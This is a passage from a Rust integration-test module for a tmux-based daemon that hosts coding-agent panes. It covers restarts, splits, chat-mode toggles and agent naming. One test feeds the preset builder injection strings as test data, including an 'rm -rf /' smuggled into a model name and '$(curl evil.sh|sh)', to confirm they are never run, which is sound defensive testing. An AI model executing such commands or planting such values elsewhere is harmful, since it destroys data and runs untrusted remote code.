        // writing into the developer's REAL `~/.claude/projects` — the check
        // reads the actual home directory — and a test that has to move
        // somebody's home directory to mean anything is a test nobody runs.
        let (_dir, svc, ws) = a_workspace().await;
        let sid = Uuid::now_v7().to_string();
        let term = svc
            .store
            .create_terminal(ws.id, "agent", "claude", TerminalIntent::Running, 80, 24)
            .unwrap();
        let term = svc
            .store
            .set_pane_mode(
                term.id,
                term.resource_version,
                models::PaneMode::Terminal,
                Some(sid.clone()),
                false,
            )
            .unwrap();

        svc.restart_terminal(term.id).await.expect("restart");
        let command = pane_start_command(&svc, term.id).await;

        assert!(
            !command.contains("--session-id"),
            "a restart must reopen the conversation, not name a new one: {command}"
        );
        assert!(!command.contains(&sid), "the id belongs to a resume or to nothing: {command}");
        assert!(command.contains("claude"), "and it is still claude in the pane: {command}");
    }

    #[tokio::test]
    async fn a_claude_pane_made_by_splitting_has_a_conversation_of_its_own() {
        // Splitting is how a pane joins a layout, which is how most panes on a
        // runner are made — and `split_terminal` read `agent_session_id` off a
        // record `store.create_terminal` had just handed back, where it is
        // always `None`. So the id was never written, and every claude pane
        // made this way had nothing for a restart to reopen and nothing for a
        // chat to load, no matter how correct the respawn builder is.
        let (_dir, svc, ws) = a_workspace().await;
        let target = svc.create_terminal(ws.id, "one", "shell").await.expect("a pane to split");

        let split = svc
            .split_terminal(
                ws.id,
                target.id,
                farcooler_protocol::v1::SplitSide::Right,
                "two",
                "claude",
            )
            .await
            .expect("split");

        let sid = split
            .agent_session_id
            .clone()
            .expect("a claude pane names its conversation at launch");
        assert_eq!(
            svc.store.get_terminal(split.id).unwrap().agent_session_id.as_deref(),
            Some(sid.as_str()),
            "and it is on the record, not merely in the returned copy"
        );

        let command = pane_start_command(&svc, split.id).await;
        assert!(
            command.contains(&format!("--session-id {sid}")),
            "the launch declares the id the record holds: {command}"
        );
    }

    #[tokio::test]
    async fn restarting_a_shell_still_gives_back_a_shell() {
        // The other half of "keep the stored mode and the actual pane in
        // agreement": routing restart through the respawn builder must not
        // change what a plain terminal comes back as.
        let (_dir, svc, ws) = a_workspace().await;
        let term = svc
            .store
            .create_terminal(ws.id, "shell", "shell", TerminalIntent::Running, 80, 24)
            .unwrap();

        svc.restart_terminal(term.id).await.expect("restart");
        let command = pane_start_command(&svc, term.id).await;

        assert!(command.contains("-il"), "{command}");
        assert!(!command.contains("-ilc"), "a shell runs nothing but itself: {command}");
    }

    #[tokio::test]
    async fn a_restarted_agent_pane_says_terminal_and_holds_a_terminal() {
        // The record has to come back with the pane. A restart puts a TUI in
        // the rectangle, so a row left saying `Agent` would have SQLite
        // claiming a chat while the pane held a terminal — no shim dials the
        // socket and the pane's activity freezes at whatever it last reported.
        let (_dir, svc, ws) = a_workspace().await;
        let sid = Uuid::now_v7().to_string();
        let term = svc
            .store
            .create_terminal(ws.id, "agent", "claude", TerminalIntent::Running, 80, 24)
            .unwrap();
        let term = svc
            .store
            .set_pane_mode(
                term.id,
                term.resource_version,
                models::PaneMode::Agent,
                Some(sid.clone()),
                false,
            )
            .unwrap();
        assert_eq!(term.pane_mode, models::PaneMode::Agent, "the fixture must start as a chat");

        let restarted = svc.restart_terminal(term.id).await.expect("restart");

        assert_eq!(restarted.pane_mode, models::PaneMode::Terminal, "the record follows the pane");
        assert_eq!(
            restarted.agent_session_id.as_deref(),
            Some(sid.as_str()),
            "and the conversation is still named, so switching back can reopen it"
        );
        let command = pane_start_command(&svc, term.id).await;
        assert!(!command.contains("agent-host"), "a restart puts back a TUI, not the shim: {command}");
    }

    /// A restart is the OTHER way a pane leaves agent mode, and it needs the
    /// same cleanup.
    ///
    /// Guarded separately because the cleanup is called from two places and
    /// only one of them had a test: deleting the `left_agent_mode` call in
    /// `restart_terminal` left the whole suite green. The supervisor's own
    /// unit tests cover what the method does; nothing covered whether this
    /// path reaches it.
    ///
    /// The activity is the half that costs something. The restart respawns the
    /// pane as a TUI and the shim dies with it, so a `Working` left behind
    /// describes a process that no longer exists — and `guard_toggle` refuses
    /// the switch back into a chat on exactly that word.
    #[tokio::test]
    async fn restarting_an_agent_pane_stops_it_answering_for_the_shim_that_died() {
        let (_dir, svc, ws) = a_workspace().await;
        let term = svc
            .store
            .create_terminal(ws.id, "agent", "claude", TerminalIntent::Running, 80, 24)
            .unwrap();
        let term = svc
            .store
            .set_pane_mode(
                term.id,
                term.resource_version,
                models::PaneMode::Agent,
                Some(Uuid::now_v7().to_string()),
                false,
            )
            .unwrap();

        // A turn in flight, put there the way a shim's events put it there.
        svc.agents().record(
            term.id,
            vec![farcooler_agent::event::AgentEvent::Message {
                role: farcooler_agent::event::Role::Agent,
                text: "half a turn".into(),
                parent: None,
            }],
            &|_, _| {},
        );
        assert_eq!(
            svc.agents().activity(term.id),
            farcooler_protocol::v1::AgentActivity::Working,
            "the fixture must start from a turn in flight"
        );

        svc.restart_terminal(term.id).await.expect("restart");

        assert_eq!(
            svc.agents().activity(term.id),
            farcooler_protocol::v1::AgentActivity::Unspecified,
            "the restart killed the shim, and nothing it reported is true any more"
        );
        assert!(
            agent_supervisor::guard_toggle(svc.agents().activity(term.id), false).is_ok(),
            "so the way back into the chat must not need forcing over a turn that is gone"
        );
    }

    /// The window a pane sits in, as tmux reports it.
    async fn window_of(svc: &Service, terminal: Uuid) -> Option<String> {
        let snapshot = svc.inventory.refresh().await;
        snapshot.claimants(terminal).into_iter().next().map(|p| p.window_id.clone())
    }

    #[tokio::test]
    async fn restarting_one_tile_leaves_the_rest_of_the_layout_standing() {
        // The most destructive thing in this file, and it was silent. Restart
        // used to run `kill_terminal_window`, which takes the WINDOW — and a
        // window is a layout now, so restarting one lost pane in a four-tile
        // arrangement killed the other three and everything running in them.
        // `kill_pane` states the rule for exactly this reason: "a window is a
        // layout and killing it would take every terminal arranged in it."
        //
        // Two panes is enough to prove it. With the old wiring the sibling has
        // no pane at all after the restart, because its window is gone.
        let (_dir, svc, ws) = a_workspace().await;
        let first = svc.create_terminal(ws.id, "one", "shell").await.expect("a pane");
        let second = svc
            .split_terminal(
                ws.id,
                first.id,
                farcooler_protocol::v1::SplitSide::Right,
                "two",
                "shell",
            )
            .await
            .expect("split");
        let layout = window_of(&svc, second.id).await.expect("the split made a pane");

        svc.restart_terminal(first.id).await.expect("restart");

        assert_eq!(
            window_of(&svc, second.id).await.as_deref(),
            Some(layout.as_str()),
            "restarting a sibling must not take this pane's window with it"
        );
        assert_eq!(
            window_of(&svc, first.id).await.as_deref(),
            Some(layout.as_str()),
            "and the restarted pane stays in the layout it was arranged into"
        );
    }
}

#[cfg(test)]
mod agent_mode_wiring_tests {
    //! The entry into agent pane mode, driven end to end.
    //!
    //! **Nothing anywhere called `Service::set_pane_mode` with
    //! `PaneMode::Agent`.** The service tests called `store.set_pane_mode`
    //! directly, which bypasses the whole function, and the RPC test said so
    //! outright. So adoption, the harness identification, the chat-capability
    //! refusals, the preset rewrite, the socket bind and the respawn had no
    //! integration coverage at all, and every suite stayed green through all
    //! of it — the same shape as a test that pinned a command builder while
    //! the value feeding it was flattened one function upstream.
    //!
    //! `restart_wiring_tests` next door shows the way and this borrows its two
    //! fixtures: a real tmux server, and `#{pane_start_command}` read back off
    //! the pane.

    use super::restart_wiring_tests::{a_workspace, pane_start_command};
    use super::*;

    /// A pane that `Registry::identify` accepts as Claude Code.
    ///
    /// By its SCREEN, not by its process name, and that is the honest case
    /// rather than a convenient one: Claude Code renames itself to its version
    /// number, so tmux reports `2.1.237` and no name matching will ever find
    /// it. Screen matching is what catches that, and `? for shortcuts` is one
    /// of the four identity markers the built-in registry carries for exactly
    /// this. Nothing here needs claude installed, which is the other half of
    /// why it is done this way — a test that only runs on a machine with an
    /// agent on it is a test CI never runs.
    pub(super) async fn a_pane_that_looks_like_claude(
        svc: &Service,
        ws: &models::Workspace,
        title: &str,
    ) -> models::Terminal {
        let term = svc.create_terminal(ws.id, title, "shell").await.expect("a pane");
        let pane = svc.pane_of(term.id).await.expect("the terminal has a pane");
        svc.tmux
            .respawn_pane(
                &pane.pane_id,
                &ws.worktree_path,
                "printf '? for shortcuts\n'; sleep 600",
            )
            .await
            .expect("respawn");

        for _ in 0..200 {
            svc.inventory.refresh().await;
            if svc
                .screen(term.id)
                .await
                .map(|(text, _, _)| text.contains("? for shortcuts"))
                .unwrap_or(false)
            {
                return term;
            }
            tokio::time::sleep(std::time::Duration::from_millis(25)).await;
        }
        panic!("the pane never drew the marker that identifies claude");
    }

    #[tokio::test]
    async fn switching_a_claude_pane_into_agent_mode_runs_the_shim() {
        let (_dir, svc, ws) = a_workspace().await;
        let term = a_pane_that_looks_like_claude(&svc, &ws, "agent").await;
        let before = svc.pane_of(term.id).await.expect("a pane").pane_id;
        let before_epoch = svc.store.get_terminal(term.id).unwrap().epoch;

        let updated = svc
            .set_pane_mode(term.id, models::PaneMode::Agent, false)
            .await
            .expect("a claude pane can be opened as a chat");

        assert_eq!(updated.pane_mode, models::PaneMode::Agent, "the record says what the pane is");

        let command = pane_start_command(&svc, term.id).await;
        assert!(command.contains("agent-host"), "the pane has to be running the shim: {command}");
        assert!(
            command.contains(&format!("--terminal {}", term.id)),
            "and hosting THIS terminal: {command}"
        );
        // Handed explicitly rather than guessed at. Without it the shim knows
        // exactly one adapter, so a codex pane switched to chat started a
        // brand new claude session and drew that instead.
        assert!(
            command.contains("--preset 'claude'"),
            "the shim is told which agent it is hosting: {command}"
        );

        // The rectangle, which is the reason this respawns rather than
        // replaces: a chat opening in one tile of four must not rearrange the
        // other three.
        assert_eq!(
            svc.pane_of(term.id).await.expect("a pane").pane_id,
            before,
            "the pane keeps its id, its tag and its place in the layout"
        );

        // `listen` was once written, tested and never called: the socket was
        // never bound, every shim retried `connect` forever, and a client
        // polling a session that was running perfectly got an empty batch.
        // Nothing but this notices that happening again.
        let socket = agent_supervisor::socket_path(&svc.root, term.id);
        assert!(
            socket.exists(),
            "the daemon has to be listening before the shim dials: {}",
            socket.display()
        );

        // What the pane turned out to be running, written down, so leaving
        // agent mode respawns THAT agent rather than the login shell this
        // terminal was created as.
        assert_eq!(
            svc.store.get_terminal(term.id).unwrap().command_preset,
            "claude",
            "the record learns which agent the pane actually held"
        );

        // The epoch, which is how every attached client learns its offsets
        // are worthless. The toggle respawned the pane: a different program is
        // writing to this terminal id now, and a client that kept reading from
        // `from_seq` where it left off is reading a stream that ended. This
        // wrote `resource_version + 1` alone, so the mode change was
        // announced and the restart under it was not.
        //
        // Read back out of the store rather than off `updated`, because the
        // question is what the row holds.
        assert_eq!(
            svc.store.get_terminal(term.id).unwrap().epoch,
            before_epoch + 1,
            "a toggle is a new runtime in the pane, and the epoch has to say so"
        );

        // Nothing is left running an adapter after the assertions.
        let _ = svc.stop_terminal(term.id).await;
    }

    #[tokio::test]
    async fn a_pane_with_nothing_in_it_is_refused_a_chat() {
        // A shell pane used to be ALLOWED into agent mode, and
        // `pane_can_adopt_a_claude_session` would then go looking for a
        // session to adopt — so switching a plain shell into chat showed
        // whatever conversation happened to be lying around in that worktree,
        // usually one belonging to a different pane. The refusal is the fix,
        // and until now nothing exercised it through `Service::set_pane_mode`
        // at all.
        let (_dir, svc, ws) = a_workspace().await;
        let term = svc.create_terminal(ws.id, "shell", "shell").await.expect("a pane");

        let refused = svc.set_pane_mode(term.id, models::PaneMode::Agent, false).await;

        assert!(
            matches!(refused, Err(DomainError::InvalidArgument { .. })),
            "a pane with no agent in it must be refused, got {refused:?}"
        );
        assert_eq!(
            svc.store.get_terminal(term.id).unwrap().pane_mode,
            models::PaneMode::Terminal,
            "and the record must not have moved"
        );
        // A refused switch must not bind a socket or spawn a listener for a
        // shim that will never dial.
        assert!(
            !agent_supervisor::socket_path(&svc.root, term.id).exists(),
            "a refused switch must leave no listener behind"
        );

        let _ = svc.stop_terminal(term.id).await;
    }

    /// The cleanup has to be REACHED, not merely written.
    ///
    /// `left_agent_mode` has its own unit tests. This is about the wiring, and
    /// the wiring is exactly what has gone missing here before —
    /// `ensure_listening` carries the note: "`listen` was written, tested and
    /// never called, so the socket was never bound ... The whole feature was
    /// inert and nothing said so."
    ///
    /// It is also the remaining half of the stale-`Working` problem. Forcing a
    /// switch out mid-turn left `Working` in the supervisor for a shim that
    /// died with the pane, and `guard_toggle` refuses the switch back IN on
    /// that word — so getting back into the chat needed `force` and a warning
    /// about discarding a turn that was already gone.
    #[tokio::test]
    async fn a_pane_forced_out_of_a_chat_mid_turn_is_not_left_reporting_a_turn() {
        let (_dir, svc, ws) = a_workspace().await;
        let term = a_pane_that_looks_like_claude(&svc, &ws, "agent").await;
        svc.set_pane_mode(term.id, models::PaneMode::Agent, false).await.expect("a chat");

        // A turn in flight, put there the way a shim's events put it there.
        svc.agents().record(
            term.id,
            vec![farcooler_agent::event::AgentEvent::Message {
                role: farcooler_agent::event::Role::Agent,
                text: "half a turn".into(),
                parent: None,
            }],
            &|_, _| {},
        );
        assert_eq!(
            svc.agents().activity(term.id),
            farcooler_protocol::v1::AgentActivity::Working,
            "the fixture must start from a turn in flight"
        );
        // Which is what makes this a FORCED switch: the unforced one is
        // refused, and that refusal is the whole reason the leftover matters.
        assert!(
            matches!(
                svc.set_pane_mode(term.id, models::PaneMode::Terminal, false).await,
                Err(DomainError::ConfirmationRequired)
            ),
            "a turn in flight must still be worth a confirmation"
        );

        svc.set_pane_mode(term.id, models::PaneMode::Terminal, true)
            .await
            .expect("forcing the switch out");

        assert_eq!(
            svc.agents().activity(term.id),
            farcooler_protocol::v1::AgentActivity::Unspecified,
            "the shim died with the pane, and nothing it reported is true any more"
        );
        assert!(
            agent_supervisor::guard_toggle(svc.agents().activity(term.id), false).is_ok(),
            "so the way back into the chat must not need forcing over a turn that is gone"
        );

        let _ = svc.stop_terminal(term.id).await;
    }

    /// The WIRING for the leftover above: that `set_pane_mode` itself writes
    /// through `record_pane_mode`.
    ///
    /// The guard below drives `record_pane_mode` directly, so it goes red when
    /// that function misbehaves and stays green when the call site is reverted
    /// to the old `store.set_pane_mode(id, term.resource_version, ..)`. That is
    /// a guard that cannot fail for the defect it was written against, which is
    /// this repo's defining failure mode, so here is the other half.
    ///
    /// Two toggles at once, and the interleaving is deterministic rather than
    /// hoped for. Each call reads the terminal synchronously at the top of
    /// `set_pane_mode` and then hits `inventory.refresh()`, which shells out to
    /// tmux and therefore returns `Pending` on its first poll — so `join!` has
    /// run BOTH reads before either future can reach its write, and both hold
    /// the same `resource_version`. Whichever writes second is writing under a
    /// version that is now one behind.
    ///
    /// `PaneMode::Terminal` deliberately, and the reason is the refusal rather
    /// than the screen capture.
    ///
    /// This fixture's pane runs `shell`, so `Registry::identify` finds no agent
    /// in it and `Agent` is refused outright — "nothing in this pane is an
    /// agent", the arm `a_pane_with_nothing_in_it_is_refused_a_chat` guards.
    /// Both calls would return `InvalidArgument` before reaching the write, and
    /// the test would prove nothing at all.
    ///
    /// Dressing the pane up as claude would not rescue it either, for a reason
    /// worth stating exactly: `harness` is computed from a screen capture that
    /// BOTH modes take — `self.screen(id).await` runs unconditionally, above
    /// the `match pane_mode` — so the capture is not what the mode changes.
    /// What the mode changes is what the answer is USED for. In the `Agent` arm
    /// it decides whether the call is refused; in `Terminal` it is computed and
    /// then thrown away by `.filter(|_| pane_mode == Agent)`. So with `Agent`
    /// the second call's verdict would depend on whether it captured before or
    /// after the first call respawned the pane into the shim, and with
    /// `Terminal` a wrong answer decides nothing.
    ///
    /// Nothing in this test needs an agent — the race is in the bookkeeping.
    ///
    /// This is exactly the case `record_pane_mode`'s doc comment claims to
    /// handle: two clients toggling one pane both reach `respawn_pane`, the
    /// last respawn is what is in the pane, and a version check could only
    /// make the record disagree with that rather than prevent it.
    #[tokio::test]
    async fn two_toggles_at_once_both_record_themselves() {
        let (_dir, svc, ws) = a_workspace().await;
        let term = svc.create_terminal(ws.id, "pane", "shell").await.expect("a pane");

        let (first, second) = tokio::join!(
            svc.set_pane_mode(term.id, models::PaneMode::Terminal, false),
            svc.set_pane_mode(term.id, models::PaneMode::Terminal, false),
        );

        assert!(
            first.is_ok() && second.is_ok(),
            "both toggles respawned the pane, so both have to be able to say so: \
             first {first:?}, second {second:?}"
        );
        // Read back off the row, and it must have moved twice: one write
        // refused is one respawn the record never learned about.
        assert_eq!(
            svc.store.get_terminal(term.id).unwrap().resource_version,
            term.resource_version + 2,
            "a refused write is a pane respawned under a record that never heard about it"
        );

        let _ = svc.stop_terminal(term.id).await;
    }

    /// The write that finishes a toggle must not lose a race it cannot win.
    ///
    /// The record used to be written under `term.resource_version`, read at
    /// the very top of `set_pane_mode` and then carried across a tmux
    /// inventory refresh, a screen capture, a whole-host `ps`, and the respawn
    /// itself. The likeliest writer in that window is the shim this very call
    /// just started: `Established` reaches SQLite through
    /// `AgentSupervisor::remember_session`, which bumps the row. The stale
    /// version then loses, `set_pane_mode` returns `ResourceConflict`, and the
    /// pane is left running an agent under a record that says terminal —
    /// forever, because nothing retries.
    ///
    /// Driven through `record_pane_mode` rather than through the whole toggle,
    /// because the race is a race: the concurrent write is made here, exactly
    /// once, instead of being hoped for. `term` is handed in stale on purpose,
    /// the way `set_pane_mode` hands it in.
    #[tokio::test]
    async fn a_toggle_still_records_itself_when_the_row_moved_under_it() {
        let dir = tempfile::tempdir().unwrap();
        let svc = Service::open_in(dir.path().to_path_buf()).await.unwrap();
        let root = svc
            .store
            .create_repository_root(svc.host_id, "/tmp/pane-mode-race", now_millis())
            .unwrap();
        let repository = svc
            .store
            .create_repository(svc.host_id, root.id, "repo", "/tmp/pane-mode-race/.git", "")
            .unwrap();
        let workspace = svc
            .store
            .create_workspace(repository.id, "feature/x", "/tmp/pane-mode-race", false)
            .unwrap();
        let term = svc
            .store
            .create_terminal(workspace.id, "pane", "claude", TerminalIntent::Running, 80, 24)
            .unwrap();

        // Somebody else writes the row between the read and the write. This is
        // the shim's `Established` arriving, spelled out.
        svc.store
            .set_pane_mode(
                term.id,
                term.resource_version,
                term.pane_mode,
                Some("the-shim-said-so".to_string()),
                false,
            )
            .unwrap();

        let recorded = svc.record_pane_mode(&term, models::PaneMode::Agent, None);
        assert!(recorded.is_ok(), "the pane is already respawned; the record has to follow: {recorded:?}");

        // Read back off the row, because the row is what every client reads.
        let held = svc.store.get_terminal(term.id).unwrap();
        assert_eq!(
            held.pane_mode,
            models::PaneMode::Agent,
            "a pane running an agent under a record that says terminal is the disagreement this design exists to prevent"
        );
        // And the id the other writer put there is not clobbered on the way.
        assert_eq!(held.agent_session_id.as_deref(), Some("the-shim-said-so"));
    }
}

#[cfg(test)]
mod pane_actor_tests {
    //! The name a pane files its board writes under, driven end to end.
    //!
    //! Every one of these goes through a `Service` method on a real tmux
    //! server and reads `#{pane_start_command}` back off the pane afterwards,
    //! because the failure being guarded is a WIRING failure and nothing else.
    //! `with_pane_env` returning the right string proves nothing about
    //! whether a launched pane got it — this tree has been silently reverted
    //! that way twice, once at `split_terminal` and once at
    //! `restart_terminal`, with a green suite pinning the builder both times.
    //!
    //! Four launch paths, four tests, plus the fifth door into a pane that is
    //! not a launch at all: switching one into a chat.

    use super::agent_mode_wiring_tests::a_pane_that_looks_like_claude;
    use super::restart_wiring_tests::{a_workspace, pane_start_command};
    use super::*;

    /// What a pane launched for `terminal` must export.
    fn expected(terminal: Uuid) -> String {
        format!("{}=agent:{terminal}", farcooler_core::pane_env::ACTOR)
    }

    #[tokio::test]
    async fn a_created_agent_pane_carries_its_own_name() {
        let (_dir, svc, ws) = a_workspace().await;
        let term = svc.create_terminal(ws.id, "agent", "claude").await.expect("a claude pane");

        let command = pane_start_command(&svc, term.id).await;
        assert!(
            command.contains(&expected(term.id)),
            "a created agent pane files its board writes as itself: {command}"
        );
    }

    #[tokio::test]
    async fn a_split_agent_pane_carries_its_own_name() {
        let (_dir, svc, ws) = a_workspace().await;
        let target = svc.create_terminal(ws.id, "one", "shell").await.expect("a pane to split");

        let split = svc
            .split_terminal(ws.id, target.id, farcooler_protocol::v1::SplitSide::Right, "two", "claude")
            .await
            .expect("split");

        let command = pane_start_command(&svc, split.id).await;
        assert!(
            command.contains(&expected(split.id)),
            "splitting is how most panes on a runner are made: {command}"
        );
        // Its own id, not the id of the pane it was split off. Both are in
        // scope at the call site and one of them is wrong.
        assert!(
            !command.contains(&expected(target.id)),
            "and it is named after itself, not after the pane it came from: {command}"
        );
    }

    #[tokio::test]
    async fn a_restarted_agent_pane_carries_its_own_name() {
        let (_dir, svc, ws) = a_workspace().await;
        let term = svc.create_terminal(ws.id, "agent", "claude").await.expect("a claude pane");

        svc.restart_terminal(term.id).await.expect("restart");

        let command = pane_start_command(&svc, term.id).await;
        assert!(
            command.contains(&expected(term.id)),
            "a pane that came back is still the same agent: {command}"
        );
    }

    #[tokio::test]
    async fn a_pane_switched_back_to_a_terminal_carries_its_own_name() {
        let (_dir, svc, ws) = a_workspace().await;
        let term = svc.create_terminal(ws.id, "agent", "claude").await.expect("a claude pane");

        let back = svc
            .set_pane_mode(term.id, models::PaneMode::Terminal, false)
            .await
            .expect("terminal");
        assert_eq!(back.pane_mode, models::PaneMode::Terminal);

        let command = pane_start_command(&svc, term.id).await;
        assert!(
            command.contains(&expected(term.id)),
            "a pane coming back from a chat is still the same agent: {command}"
        );

        let _ = svc.stop_terminal(term.id).await;
    }

    /// The chat, whose preset the record has not caught up with yet.
    ///
    /// This is the case a wrap reading `command_preset` would have missed
    /// entirely: the terminal was created as `shell`, Claude Code is what is
    /// actually running in it, and `preset_after_adopting` does not write that
    /// down until after the respawn. The pane most likely to be a dispatched
    /// agent is the one whose record is least likely to say so.
    #[tokio::test]
    async fn a_pane_opened_as_a_chat_carries_its_own_name() {
        let (_dir, svc, ws) = a_workspace().await;
        let term = a_pane_that_looks_like_claude(&svc, &ws, "agent").await;
        assert_eq!(
            svc.store.get_terminal(term.id).unwrap().command_preset,
            "shell",
            "the record still says shell at the moment the command is built"
        );

        svc.set_pane_mode(term.id, models::PaneMode::Agent, false)
            .await
            .expect("a claude pane can be opened as a chat");

        let command = pane_start_command(&svc, term.id).await;
        assert!(command.contains("agent-host"), "the pane is running the shim: {command}");
        assert!(
            command.contains(&expected(term.id)),
            "and the agent under it files its board writes as this pane: {command}"
        );

        let _ = svc.stop_terminal(term.id).await;
    }

    /// The predicate and the builder agree, preset by preset.
    ///
    /// Neither half is interesting alone, and testing them apart is how three
    /// branches went unguarded: `preset_runs_an_agent` could return true for a
    /// preset `preset_command_with_hooks` refuses to run, and the seven
    /// end-to-end tests below would all still pass because none of them uses
    /// such a preset. What has to hold is the EQUIVALENCE -- a pane is named
    /// an agent exactly when a named program was put in it -- so that is what
    /// is asserted, over every shape of preset this daemon can be handed.
    ///
    /// The two commands that are not an agent are spelled out rather than
    /// pattern-matched: a person's login shell, and the changes host. Anything
    /// else the builder emits is a program somebody dispatched.
    #[test]
    fn a_pane_is_named_an_agent_exactly_when_one_was_launched_in_it() {
        let a_persons_shell = format!("{} -il", farcooler_core::shell::login_shell());
        let the_changes_host = changes_host_command();

        for preset in [
            // Agents, including one from an adapter this build never heard of.
            "claude",
            "codex",
            "cursor",
            "aider",
            "claude:opus",
            "codex:gpt-5.6-sol",
            // A model that is not an identifier is dropped, but claude still
            // runs -- so this is still an agent pane.
            "claude:opus'; rm -rf /; '",
            // A person's prompt, with and without a suffix.
            "shell",
            "shell:zsh",
            // The diff rectangle, with and without a suffix.
            CHANGES_PRESET,
            "changes:anything",
            // Presets that reach the builder's final arm and are NOT RUN. The
            // pane gets a login shell, so the person at it is a person.
            "a b",
            "$(curl evil.sh|sh)",
            "claude opus",
        ] {
            let command = preset_command_with_hooks(preset, None, &LaunchExtras::NONE);
            let launched_an_agent =
                command != a_persons_shell && command != the_changes_host;
            assert_eq!(
                preset_runs_an_agent(preset),
                launched_an_agent,
                "{preset:?} runs {command:?}, which the two halves disagree about"
            );
        }
    }

    /// A pane holding a diff is not an agent either.
    ///
    /// The `changes` half of the rule, through a real launch rather than only
    /// through the predicate: nobody dispatched a rectangle to work a ticket,
    /// and `farcooler pane-host` has no board writes to file.
    #[tokio::test]
    async fn a_changes_pane_names_no_agent() {
        let (_dir, svc, ws) = a_workspace().await;
        let term = svc
            .create_terminal(ws.id, "diff", CHANGES_PRESET)
            .await
            .expect("a changes pane");

        let command = pane_start_command(&svc, term.id).await;
        assert!(command.contains("pane-host"), "this is the changes host: {command}");
        assert!(
            !command.contains(farcooler_core::pane_env::ACTOR),
            "a pane holding a diff names no agent: {command}"
        );
    }

    /// A preset carrying a model is still the agent it names.
    ///
    /// The head split, through a real launch. Dropping it would leave
    /// `claude:opus` compared whole against `shell`, which happens to give the
    /// right answer here and the wrong one for `shell:zsh` -- which is why the
    /// equivalence test above carries both.
    #[tokio::test]
    async fn an_agent_pane_with_a_model_still_names_itself() {
        let (_dir, svc, ws) = a_workspace().await;
        let term = svc
            .create_terminal(ws.id, "agent", "claude:opus")
            .await
            .expect("a claude pane");

        let command = pane_start_command(&svc, term.id).await;
        assert!(command.contains("claude --model opus"), "the preset ran: {command}");
        assert!(
            command.contains(&expected(term.id)),
            "and it is an agent pane like any other: {command}"
        );
    }

    /// A preset the builder will not run leaves a person at a prompt, so the
    /// board must not be told an agent is typing.
    ///
    /// The reverse of the failure item 1 exists to fix, and just as expensive.
    /// `validate::command_preset` accepts any short ASCII string, so a preset
    /// with a space in it reaches `preset_command_with_hooks`'s final arm and
    /// gets a login shell -- and every `farcooler task note` somebody typed
    /// into it would have filed under `agent:<this pane>`.
    #[tokio::test]
    async fn a_preset_that_is_never_run_leaves_a_person_at_the_prompt() {
        let (_dir, svc, ws) = a_workspace().await;
        let term = svc
            .create_terminal(ws.id, "odd", "claude opus")
            .await
            .expect("an odd preset still opens a pane");

        // tmux quotes a start command that has a space in it, so the quotes
        // are trimmed before the tail is read rather than matched against.
        let command = pane_start_command(&svc, term.id).await;
        assert!(
            command.trim_matches('"').ends_with(" -il"),
            "the builder refused to run it and gave a login shell: {command}"
        );
        assert!(
            !command.contains(farcooler_core::pane_env::ACTOR),
            "a person at a prompt is a person: {command}"
        );
    }

    /// A person's own prompt is a person, and `user` is what that means.
    ///
    /// The other half of the rule, and the more expensive half to get wrong:
    /// filing somebody's typed `farcooler task note` under an agent id would
    /// put a name on the record that nothing downstream could tell from a real
    /// one. `Actor` has three words and the whole reason it has three is this
    /// distinction.
    #[tokio::test]
    async fn a_shell_pane_is_left_as_a_person() {
        let (_dir, svc, ws) = a_workspace().await;
        let term = svc.create_terminal(ws.id, "shell", "shell").await.expect("a shell pane");

        let command = pane_start_command(&svc, term.id).await;
        assert!(
            !command.contains(farcooler_core::pane_env::ACTOR),
            "a pane a person types into names no agent: {command}"
        );
    }

    /// A pane opened for no task still claims none.
    ///
    /// The point of the test this replaced (`no_pane_claims_a_ticket_nothing_knows`),
    /// kept now that a terminal CAN name a task: a guessed key files an
    /// agent's notes on somebody else's ticket, and the board reads as though
    /// the work had been done.
    #[tokio::test]
    async fn a_pane_opened_for_no_task_claims_none() {
        let (_dir, svc, ws) = a_workspace().await;
        let term = svc.create_terminal(ws.id, "agent", "claude").await.expect("a claude pane");

        let command = pane_start_command(&svc, term.id).await;
        assert!(command.contains(super::test_agent::MARKER), "the stub, not claude: {command}");
        assert!(
            !command.contains(farcooler_core::pane_env::TASK),
            "no task on the record, so none in the pane: {command}"
        );
    }

    /// A task on this workspace's board, and its key.
    fn a_task(svc: &Service, ws: &models::Workspace) -> (Uuid, String) {
        let task = svc
            .store
            .create_task(ws.repository_id, "a task", farcooler_store::models::Actor::User)
            .expect("a task");
        (task.id, task.key)
    }

    /// A pane opened for a task says so, and still says so after a restart,
    /// which is the path most panes have taken by the end of a day.
    ///
    /// The record is written straight to the store and the pane is made by
    /// the restart, so no agent is ever launched with a first message here:
    /// this is the relaunch's wiring, read off the pane tmux was handed.
    #[tokio::test]
    async fn a_pane_opened_for_a_task_names_it_across_a_restart() {
        let (_dir, svc, ws) = a_workspace().await;
        let (task, key) = a_task(&svc, &ws);
        let term = svc
            .store
            .create_terminal_for_task(ws.id, "w", "claude", TerminalIntent::Running, 80, 24, Some(task))
            .unwrap();

        svc.restart_terminal(term.id).await.expect("restart");
        let command = pane_start_command(&svc, term.id).await;
        assert!(
            command.contains(&format!("{}={key}", farcooler_core::pane_env::TASK)),
            "a restarted pane names the task it was opened for: {command}"
        );
        assert!(command.contains(&expected(term.id)), "beside its own name: {command}");
    }

    /// The opening prompt is the first launch's alone. A restart that replayed
    /// it would start the work over on top of the work.
    ///
    /// **No agent is started.** Under test every agent's program is stubbed
    /// (`agent_program`), so the pane runs
    /// `<login shell> -ilc '/bin/sh -c exec\ /bin/sleep\ 600 farcooler-test-stub-agent claude … <prompt>'`:
    /// a `sh` that sleeps, holding the prompt as a positional parameter it
    /// never reads. That is airtight in a way a trust screen is not: the message
    /// tells an agent to run board commands through a CLI that, from a test
    /// binary, is whatever `farcooler` is on PATH, and so the live daemon.
    /// The stub is checked in the pane itself, not assumed.
    #[tokio::test]
    async fn only_the_first_launch_is_told_what_to_do() {
        let (_dir, svc, ws) = a_workspace().await;
        let (task, key) = a_task(&svc, &ws);
        let term = svc
            .create_terminal_with_prompt(ws.id, "w", "claude", None, Some(task))
            .await
            .expect("a pane opened for a task");
        assert_eq!(svc.store.get_terminal(term.id).unwrap().task_id, Some(task), "on the record");

        let first = pane_start_command(&svc, term.id).await;
        assert!(first.contains(super::test_agent::MARKER), "the stub, not claude: {first}");
        assert!(!first.contains("'claude "), "no real agent was started: {first}");
        // Quoted twice on its way into the pane, so an apostrophe reads back
        // escaped; the words between them do not.
        assert!(first.contains(&format!("re working {key} on this repository")), "told what to do: {first}");
        assert!(first.contains(&format!("{}={key}", farcooler_core::pane_env::TASK)), "{first}");

        svc.restart_terminal(term.id).await.expect("restart");
